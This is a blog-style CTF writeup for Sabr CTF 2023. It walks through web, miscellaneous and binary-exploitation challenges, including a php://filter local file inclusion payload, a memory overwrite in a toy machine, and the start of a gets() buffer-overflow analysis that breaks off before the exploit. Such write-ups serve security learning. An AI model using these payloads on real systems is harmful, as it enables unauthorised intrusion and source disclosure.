---
layout: default
title : Sabr CTF 2023 Writeup
---

### CTF Overview

sabrCTF is an online 7-day Jeopardy Capture The Flag competition that mainly features challenges in the topics of reverse engineering and binary exploitation.

### Web Category 

### Seikooc: 
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/seikooc/1.png)

So on navigating to the web page I got this

We can see it just shows cookie and its more of a static page.

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/seikooc/2.png)

Next thing I did was to check the source code maybe I will see anything of interest there but too bad nothing really is there only a word which is embedded in the `<img src>` tag which is “Find the flag!”

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/seikooc/3.png)

Now the challenge name has given us hint already seikooc == say cookie.

Lets check the cookie present in the web server using curl.
```
┌──(mark㉿haxor)-[~/…/CTF/Sabr/web/seikooc]
└─$ curl -v http://13.36.37.184:45250/ | head -n 1
*   Trying 13.36.37.184:45250...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to 13.36.37.184 (13.36.37.184) port 45250 (#0)
> GET / HTTP/1.1
> Host: 13.36.37.184:45250
> User-Agent: curl/7.86.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sat, 14 Jan 2023 00:59:43 GMT
< Server: Apache/2.4.54 (Debian)
< X-Powered-By: PHP/8.2.1
< Set-Cookie: flag=c2FicntjMDBrMTNzX3NoMHVsZF80bHc0eXNfYjNfY2gzY2tFZCEhIX0%3D; expires=Sat, 14 Jan 2023 01:59:43 GMT; Max-Age=3600
< Vary: Accept-Encoding
< Content-Length: 1282
< Content-Type: text/html; charset=UTF-8
< 
{ [1282 bytes data]
100  1282  100  1282    0     0   4174      0 --:--:-- --:--:-- --:--:--  4273
* Connection #0 to host 13.36.37.184 left intact
```

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/seikooc/4.png)

We can see there’s a cookie present and its encoded now lets decode the value using cyberchef.

But also if we notice the end of the flag cookie we see its url encoded

Here’s the decoding from cyberchef

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/seikooc/5.png)

Flag: sabr{c00k13s_sh0uld_4lw4ys_b3_ch3ckEd!!!}

### Tunnel Vision:
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/tunnelvision/1.png)

On navigating to the web page we get two links to click.

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/tunnelvision/2.png)

Checking source code doesn’t really reveal anything. So lets check the links out.

After clicking the first link I got redirected to a page that shows `nope:)`

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/tunnelvision/3.png)

I checked the second link but instead this shows another page that has 2 links again

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/tunnelvision/4.png)

I kept on clicking and it kept on redirecting to a new page that has new links to click or it shows `nope`.

Obviously scripting your way out is the best thing to do. I made the solve script (with the help of chatgpt: noob coder smh) 

Here's the solve script [Solve](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/sabr/web/tunnel_vision.py)

Basically what the script does is to loop the connection made to the web server then finds each path in the web source code which is then stored in the paths variable and also if no path if found then the code breaks.

After that a for loop is called which will iterate the values stored in the path variable and perform a get request with the new path then it check if nope is in the response and if it is indeed there it removes the nope path and attempt to use another path.

Then the loop keeps on going till it finds `sabr{` in the response which is the flag format per se, after it does that it will then print out the content of the response.

Now lets run the code:
```
┌──(mark㉿haxor)-[~/…/CTF/Sabr/web/tunnel_vision]
└─$ python3 exploit.py                               
Getting page from: http://13.36.37.184:45260
Found 2 possible paths: ['/?path=z6qpcm5thexk', '/?path=41ebqfmu6onizs8']
Sorry, you have reached a dead end. Please retry
Getting page from: http://13.36.37.184:45260/?path=41ebqfmu6onizs8
Found 2 possible paths: ['/?path=b6aiup8z0g', '/?path=rd9quwhvp5n']
Sorry, you have reached a dead end. Please retry
Getting page from: http://13.36.37.184:45260/?path=rd9quwhvp5n
Found 2 possible paths: ['/?path=k54g6abnp9', '/?path=6r4gytkfsdxcj']
Sorry, you have reached a dead end. Please retry
Getting page from: http://13.36.37.184:45260/?path=6r4gytkfsdxcj
Found 2 possible paths: ['/?path=h61u7yjon0xabk', '/?path=nlu4voze3i']
Sorry, you have reached a dead end. Please retry
Getting page from: http://13.36.37.184:45260/?path=nlu4voze3i
Found 2 possible paths: ['/?path=14xr785t', '/?path=qpjb40863ifs']
[[-----------------------SNIP---------------------------------]]
Found 2 possible paths: ['/?path=05kezdfopaiyh', '/?path=uviswzk5qjl6h8g0']
Sorry, you have reached a dead end. Please retry
Getting page from: http://13.36.37.184:45260/?path=uviswzk5qjl6h8g0
Found 2 possible paths: ['/?path=156dfs3g0miv9h', '/?path=ncx7khzue1v5oysp']
The flag is: <strong>flag:</strong> <span>sabr{th3_r0b0t_sa1d:_8089}</span>
```

After few minutes of it generating get request with the valid paths I got the flag.

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/tunnelvision/5.png)

Flag: sabr{th3_r0b0t_sa1d:_3e41}

### Wargamez:
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/wargamez/1.png)

On navigating to the web page I got this

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/wargamez/2.png)

And immediately I noticed the url schema:

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/wargamez/3.png)

We can clearly see that it is including the themes and its specifying the path where the dark theme is.

Now one way to take advantage of this vulnerability is by exploiting it via Local File Inclusion (LFI).

So I tried basic LFI Payloads but none worked and since the description of the challenge says that no fuzzing required I then decided to read the source code of the vulnerably php file (index.php) using php filters.

```
php://filter/read=convert.base64-encode/resource=index.php
```

So that will read the file then convert it to base64 cause if no conversion is done the web page will treat is as a php code which won’t show the source code.

At first we won’t see anything in here.

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/wargamez/4.png)

But on checking the source code we have a base64 encoded blob

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/wargamez/5.png)

I copied and saved the encoded blob on my machine to do the decoding.

```
┌──(mark㉿haxor)-[~/…/CTF/Sabr/web/wargamez]
└─$ nano encodedblob
                                                                                                        
┌──(mark㉿haxor)-[~/…/CTF/Sabr/web/wargamez]
└─$ cat encodedblob | base64 -d > index.php
                                                                                                        
┌──(mark㉿haxor)-[~/…/CTF/Sabr/web/wargamez]
└─$ 

```

Now on reading the source code we can clearly see the flag which is commented

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/wargamez/6.png)

Flag: sabr{w3lc0m3_t0_th3_w0rld_0f_w4rg4m3s}


### Miscellaneous Category 

### Sanity:
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/misc/sanity/1.png)

This just checks whether you are sane i think 🤔

Flag: sabr{Welcome_To_Sabr_CTF}

### Simple machine:
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/misc/simplemachine/1.png)

We are given a remote service to connect to now lets check out what it does

```
┌──(mark㉿haxor)-[~/…/CTF/Sabr/misc/simplemachine]
└─$  nc 13.36.37.184 9099 

 ▄▄█████████ ▄███▄   ▄▄███ ▄▄████████▄ ▄▄████████▄ ▄███   ▄███ ▄█████████ ▄███   ▄███ ▄▄█████████
 ████▀▀▀▀▀▀▀ ██████▄██████ ████▀▀▀████ ████▀▀▀████ ████   ████ ▀▀▀████▀▀▀ █████▄ ████ ████▀▀▀▀▀▀▀
 ████▄▄▄▄▄▄  ████▀███▀████ ████▄▄▄████ ████   ▀▀▀▀ ████▄▄▄████    ████    ███████████ ████▄▄▄    
 ▀▀▀▀▀▀▀████ ████ ▀▀▀ ████ ████▀▀▀████ ████   ▄▄▄▄ ████▀▀▀████    ████    ████▀▀█████ ████▀▀▀    
 ▄▄▄▄▄▄▄████ ████     ████ ████   ████ ████▄▄▄████ ████   ████ ▄▄▄████▄▄▄ ████  ▀████ ████▄▄▄▄▄▄▄
 ██████████▀ ████     ████ ████   ████ ▀█████████▀ ████   ████ ██████████ ████   ████ ▀██████████
 ▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀     ▀▀▀▀ ▀▀▀▀   ▀▀▀▀  ▀▀▀▀▀▀▀▀▀  ▀▀▀▀   ▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀   ▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀
 Welcome to the Simple Machine. Type help or ? to list operations.


#> help

Documented commands (type help <topic>):
========================================
add  and  help  mul  or  regs  sub  win  xor

#> 

```

We are greeted with a banner and some sort of command line interface.

Using either ? or help we can view the commands that can be ran on this terminal.

Now the goal of this task is to set any register to 0x1337.

We can view the current state of all registers present using the regs comamnd

```
#> regs
x0 = 0x0000
x1 = 0x0000
x2 = 0x0000
x3 = 0x0000
x4 = 0x0000
x5 = 0x0000
x6 = 0x0000
x7 = 0x0000
x8 = 0x0000
x9 = 0x0000
#> 
```

And we see that its all set to 0.

From this now try using the help and see what each command does

```
#> help

Documented commands (type help <topic>):
========================================
add  and  help  mul  or  regs  sub  win  xor

#> 
```

This option (add) seems like the best to use right now.

Now next thing I did was to obviously try adding 0x1337 to any of the register which in this case i used register x0

```
#> add x0 0x1337
Invalid Syntax
#> 
```

But we see that we can’t really include 0 in as a value to add

So I tried adding 1337 to register x0 and checking the value using the regs command

```
#> add x0 1337
#> regs
x0 = 0x0a72
x1 = 0x0000
x2 = 0x0000
x3 = 0x0000
x4 = 0x0000
x5 = 0x0000
x6 = 0x0000
x7 = 0x0000
x8 = 0x0000
x9 = 0x0000
#> 
```

But weird when I checked the registers it showed another value.

So it took me some hours to figure out that the value we give it is converted from decimal to hex. Now this is interesting.

So next thing I did was to use the decimal representation of the hexadecimal value 0x1337 which is 4919

But i had to first subtract the initial value i put in the register using the sub command.

But on running it I got Bad Result as an output.

```
#> sub x0 1337
#> regs
x0 = 0x0000
x1 = 0x0000
x2 = 0x0000
x3 = 0x0000
x4 = 0x0000
x5 = 0x0000
x6 = 0x0000
x7 = 0x0000
x8 = 0x0000
x9 = 0x0000
#> add x0 4919
Bad Result.
#> 
```

Hmmm painful.. So next I tried add 4918 = 0x1336 to the register

```
#> add x0 4918
#> regs
x0 = 0x1336
x1 = 0x0000
x2 = 0x0000
x3 = 0x0000
x4 = 0x0000
x5 = 0x0000
x6 = 0x0000
x7 = 0x0000
x8 = 0x0000
x9 = 0x0000
#> 
```
Well that worked we wrote 0x1336 to the register but we need to add 1 to make it 0x1337 but when i try adding 1 i.e add x0 1 I still got `Bad Result` as an error

So at this point I went to check other commands we can run

Now xor also adds value to the register we specify.

So next thing I did was to use it and add 1 to the register x0

```
#> help

Documented commands (type help <topic>):
========================================
add  and  help  mul  or  regs  sub  win  xor

#> xor x0 1
#> regs
x0 = 0x1337
x1 = 0x0000
x2 = 0x0000
x3 = 0x0000
x4 = 0x0000
x5 = 0x0000
x6 = 0x0000
x7 = 0x0000
x8 = 0x0000
x9 = 0x0000
#> 
```

Now that we have made the register the exact value lets call the win function

```
#> win
You Win, Flag is sabr{S1MPL3_STACK_M4CH1N3}
```

Now from what I noticed the xor command adds the exact value of what we want the register to be, so for confirming sake I decided to try it out

```
#> xor x0 4919
#> regs
x0 = 0x1337
x1 = 0x0000
x2 = 0x0000
x3 = 0x0000
x4 = 0x0000
x5 = 0x0000
x6 = 0x0000
x7 = 0x0000
x8 = 0x0000
x9 = 0x0000
#> 
```

Nice it also was able to add any number we specify to any register from here we can call win function

```
#> win
You Win, Flag is sabr{S1MPL3_STACK_M4CH1N3}
```

Here’s my python script to initialize the connection then do the evaluations and also call the win function [Solve](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/sabr/misc/simplemachine.py)



![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/misc/simplemachine/scriptresult.png)

Flag: sabr{S1MPL3_STACK_M4CH1N3}

### Complex machine:
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/misc/complexmachine/1.png)

We’re given a remote service to connect to also lets check it out and note from the description is that we should call either win or flag function.

On connecting to it we see just like the previous simple machine cli but this time it has more commands that can be run.

```
┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/misc/complexmachine]
└─$ nc 13.36.37.184 9092

 ▄▄████████▄ ▄███▄   ▄▄███ ▄▄████████▄ ▄▄████████▄ ▄███   ▄███ ▄█████████ ▄███   ▄███ ▄▄█████████
 ████▀▀▀████ ██████▄██████ ████▀▀▀████ ████▀▀▀████ ████   ████ ▀▀▀████▀▀▀ █████▄ ████ ████▀▀▀▀▀▀▀
 ████   ▀▀▀▀ ████▀███▀████ ████▄▄▄████ ████   ▀▀▀▀ ████▄▄▄████    ████    ███████████ ████▄▄▄    
 ████   ▄▄▄▄ ████ ▀▀▀ ████ ████▀▀▀████ ████   ▄▄▄▄ ████▀▀▀████    ████    ████▀▀█████ ████▀▀▀    
 ████▄▄▄████ ████     ████ ████   ████ ████▄▄▄████ ████   ████ ▄▄▄████▄▄▄ ████  ▀████ ████▄▄▄▄▄▄▄
 ▀█████████▀ ████     ████ ████   ████ ▀█████████▀ ████   ████ ██████████ ████   ████ ▀██████████
  ▀▀▀▀▀▀▀▀▀  ▀▀▀▀     ▀▀▀▀ ▀▀▀▀   ▀▀▀▀  ▀▀▀▀▀▀▀▀▀  ▀▀▀▀   ▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀   ▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀
                                                                                                 
 Welcome to the Complex Machine. Type help or ? to list operations.


#> help

Documented commands (type help <topic>):
========================================
add  call       help  login  mul  readstr  store  xor
and  functions  load  mem    or   regs     sub  

#> 
```

Now lets check the registers present using the regs command

```
#> regs
x0 = 0x0000
x1 = 0x0000
x2 = 0x0000
x3 = 0x0000
x4 = 0x0000
x5 = 0x0000
x6 = 0x0000
x7 = 0x0000
x8 = 0x0000
x9 = 0x0000
#> 
```

They are all set to zero but also we have a command called functions lets see what functions we have stored.

```

#> functions
Available Functions: 
        echo
        strreverse
        randstring
        strtohex
#> 
```

Cool we have the functions present.

We have other commands to check lets check out the mem command

```
#> mem
00000000: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000020: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000030: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000040: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000050: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000060: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000070: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000080: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000090: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000A0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000C0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000D0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000E0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000F0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000100: 65 63 68 6F 00 00 00 00  00 00 00 00 00 00 00 00  echo............
00000110: 73 74 72 72 65 76 65 72  73 65 00 00 00 00 00 00  strreverse......
00000120: 72 61 6E 64 73 74 72 69  6E 67 00 00 00 00 00 00  randstring......
00000130: 73 74 72 74 6F 68 65 78  00 00 00 00 00 00 00 00  strtohex........
00000140: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000150: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000160: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000170: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000180: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000190: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001A0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001C0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001D0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001E0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001F0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
#> 
```

From the result we can see that this is the memory address in which the functions are stored.

Lets check the command login and we need to pass an argument which is the password

```
#> login hacker
Invalid password: hacker !
#> login gimmeflag
Invalid password: gimmeflag !
#> 
```

Now lets check the memory address back

```
#> mem
00000000: 67 69 6D 6D 65 66 6C 61  67 00 00 00 00 00 00 00  gimmeflag.......
00000010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000020: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000030: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000040: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000050: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000060: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000070: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000080: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000090: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000A0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000C0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000D0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000E0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000F0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000100: 65 63 68 6F 00 00 00 00  00 00 00 00 00 00 00 00  echo............
00000110: 73 74 72 72 65 76 65 72  73 65 00 00 00 00 00 00  strreverse......
00000120: 72 61 6E 64 73 74 72 69  6E 67 00 00 00 00 00 00  randstring......
00000130: 73 74 72 74 6F 68 65 78  00 00 00 00 00 00 00 00  strtohex........
00000140: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000150: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000160: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000170: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000180: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000190: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001A0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001C0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001D0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001E0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001F0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
#> 
```

We see that the login command argument we passed is been stored in the memory address

At this point what i then did was to overwrite any real function and replace with win.

How can this be achieved ?

Well by passing in junkdata +win

So I did that on my terminal to create a's' ("a"*256 + "win"), how i knew to use a*256 was by calculating the amount of bytes needed to reach the echo function in the memory address' 

```                                                                                                        
┌──(mark㉿haxor)-[~/…/CTF/Sabr/misc/complexmachine]
└─$ python2 -c 'print"a"*256+"win"'
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawin                                                                           
```

Now using that as the argument to login 

```
#> login aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawin
Invalid password: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawin !
#> 
```

Now on checking the memory address we see that the echo function has been overwritten by win

```
#> mem
00000000: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
00000010: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
00000020: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
00000030: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
00000040: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
00000050: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
00000060: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
00000070: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
00000080: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
00000090: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
000000A0: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
000000B0: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
000000C0: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
000000D0: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
000000E0: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
000000F0: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
00000100: 77 69 6E 00 00 00 00 00  00 00 00 00 00 00 00 00  win.............
00000110: 73 74 72 72 65 76 65 72  73 65 00 00 00 00 00 00  strreverse......
00000120: 72 61 6E 64 73 74 72 69  6E 67 00 00 00 00 00 00  randstring......
00000130: 73 74 72 74 6F 68 65 78  00 00 00 00 00 00 00 00  strtohex........
00000140: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000150: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000160: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000170: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000180: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000190: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001A0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001C0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001D0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001E0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001F0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
#> 
```

We can confirm by checking the available functions using the function command

```
#> functions
Available Functions: 
        win
        strreverse
        randstring
        strtohex
#> 
```

Now lets try calling the win function 

And there’s a command that can call any function stored in the memory address `call`

```
#> call win
Invalid Argument!
#> 
```

But we get invalid argument. 

From this I remembered the previous machine required changing the value of any register to 0x1337 and calling the win command so i tried that here also

```
#> xor x0 4919
#> regs
x0 = 0x1337
x1 = 0x0000
x2 = 0x0000
x3 = 0x0000
x4 = 0x0000
x5 = 0x0000
x6 = 0x0000
x7 = 0x0000
x8 = 0x0000
x9 = 0x0000
#> 
```

Now lets call the win function again

```
#> call win
You Win, Flag is sabr{0x7563_is_TOO_Large_for_this_Machine}
```

And I got the flag.

Here’s my python script i used to solve it

It might take few seconds for it to print the flag [Solve](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/sabr/misc/complexmachine.py)

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/misc/complexmachine/scriptresult.png)

Flag: sabr{0x7563_is_TOO_Large_for_this_Machine}

### Binary Exploitation Category 

### 0v3reZ:
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/1.png)

We are given a binary and a remote service to connect to lets download the binary on our machine and analyze it

So at this point I did basic file check
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/2.png)
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/3.png)

We see its a 64 bit binary, dynamically linked and its stripped (meaning we won’t be able to see the functions name i.e main func)

We can also see that the binary has partial relro, it has no canary (so if we can perform a buffer overflow we won’t be stopped by stack protector), nx enabled (if we can inject shellcode to the stack we won't be able to execute it), no pie ( the address when the binary loads is static)

Please forgive me for not explaining those terms well as am not that good at binary exploitation yet

Now lets run this binary to get an overview of what is happening

```
┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/pwn/0v3reZ]
└─$ ./0v3reZ

 ▄▄████████▄ ▄███   ▄███ ▄█████████▄ ▄█████████▄ ▄▄█████████ ▄██████████
 ████▀▀▀████ ████   ████ ▀▀▀▀▀▀▀████ ████▀▀▀████ ████▀▀▀▀▀▀▀ ▀▀▀▀▀▀█████
 ████   ████ ████   ████     ▄▄▄███▀ ████▄▄▄███▀ ████▄▄▄         ▄████▀▀
 ████   ████ ████  ▄████     ▀▀▀███▄ ████▀▀▀███▄ ████▀▀▀       ▄████▀▀  
 ████▄▄▄████ ████▄█████▀ ▄▄▄▄▄▄▄████ ████   ████ ████▄▄▄▄▄▄▄ ▄█████▄▄▄▄▄
 ▀█████████▀ ████████▀▀  ██████████▀ ████   ████ ▀██████████ ███████████
  ▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀    ▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀   ▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀


b0fz: hello
```

We see it just prints out a banner then takes in our input and exits

I then decompiled the binary using ghidra to analyze the functions in it
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/4.png)

Now lets view the functions present but since its stripped we won’t exactly see the real function names.

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/5.png)

On checking the content of each functions I saw this in FUN_00401200 which is likely the main function.
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/6.png)

Let me try to rename it to how its likely going to look like in the real c code

```
int main(void)

{
  char input[32]; //allocating 32 bytes of data in the buffer
  
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  alarm(0x3c);
  design(); //calling the design function
  printf("b0fz: ");
  gets(input); //using dangerous gets function
  return 0;
}
```

On checking the other functions I came across this one also FUN_004011d6 which is a function calling /bin/sh
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/7.png)

Also let me try to rename it to how its likely going to look like in the real c code

```
void shell(void)

{
  system("/bin/sh");
  return;
}
```

Now from this what we can conclude is that there’s a function which call /bin/sh which would give us shell

But the main function isn’t calling that function

And also the main function is storing our input in a buffer which only allocates 32bytes in it and its using a vulnerable function which is `get` to receive our input.

